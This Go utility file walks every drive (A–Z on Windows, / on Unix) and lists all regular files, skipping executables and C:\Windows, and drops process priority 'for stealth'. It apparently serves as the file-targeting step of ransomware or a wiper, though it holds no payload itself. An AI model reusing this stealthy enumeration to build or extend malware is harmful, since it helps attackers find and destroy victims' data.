package utils

import (
	"io/fs"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/hekmon/processpriority"
)

var executable_extensions = []string{".exe", ".dll", ".sys"}

var default_paths_win = []string{"A:\\", "C:\\", "D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "I:\\", "J:\\",
	"K:\\", "L:\\", "M:\\", "N:\\", "O:\\", "P:\\", "Q:\\", "R:\\", "S:\\", "T:\\", "U:\\", "V:\\",
	"W:\\", "X:\\", "Y:\\", "Z:\\",
}
var default_paths_unix = []string{"/"}

func stringInSlice(v string, ss []string) bool {
	for _, s := range ss {
		if s == v {
			return true
		}
	}
	return false
}

func PopulateListBl(file_list *[]string, blacklist []string) func(path string, info fs.FileInfo, err error) error {
	return func(path string, info fs.FileInfo, err error) error {
		if info.Mode().IsRegular() && !stringInSlice(filepath.Ext(path), blacklist) && !strings.HasPrefix(path, "C:\\Windows") {
			*file_list = append(*file_list, path)
		}
		return nil
	}
}

func PopulateListWl(file_list *[]string, whitelist []string) func(path string, info fs.FileInfo, err error) error {
	return func(path string, info fs.FileInfo, err error) error {
		if info.Mode().IsRegular() && stringInSlice(filepath.Ext(path), whitelist) {
			*file_list = append(*file_list, path)
		}
		return nil
	}
}

func CrawlWL(wl []string) []string {
	var file_list []string
	var default_paths []string = default_paths_unix
	if runtime.GOOS == "windows" {
		default_paths = default_paths_win
	}
	for _, default_path := range default_paths {
		if _, err := os.Stat(default_path); !os.IsNotExist(err) {
			filepath.Walk(default_path, PopulateListWl(&file_list, wl))
		}
	}
	return file_list
}

// process priority will be set to below normal for stealth
func Crawl() []string {
	var file_list []string
	var default_paths []string = default_paths_unix
	if runtime.GOOS == "windows" {
		default_paths = default_paths_win
	}
	processpriority.Set(os.Getpid(), processpriority.BelowNormal)
	for _, default_path := range default_paths {
		if _, err := os.Stat(default_path); !os.IsNotExist(err) {
			filepath.Walk(default_path, PopulateListBl(&file_list, executable_extensions))
		}
	}
	processpriority.Set(os.Getpid(), processpriority.Normal)
	return file_list
}
